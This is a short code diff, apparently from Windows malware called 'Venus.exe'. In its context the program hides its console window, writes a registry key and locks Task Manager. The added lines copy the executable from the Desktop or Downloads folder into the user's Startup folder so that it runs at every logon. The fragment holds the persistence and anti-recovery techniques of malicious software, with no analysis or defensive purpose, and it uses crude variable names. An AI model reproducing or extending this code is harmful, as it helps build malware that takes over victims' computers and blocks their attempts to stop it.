@@ -60,6 +60,8 @@ if(RegCreateKeyEx(HKEY_CURRENT_USER,
 
 int main() {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
+    system("copy \"%USERPROFILE%\\Desktop\\Venus.exe\" \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
+    system("copy \"%USERPROFILE%\\Downloads\\Venus.exe\" \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
     LockTaskManager(true);
    ifstream furryporn;
    furryporn.open(gaydiro);
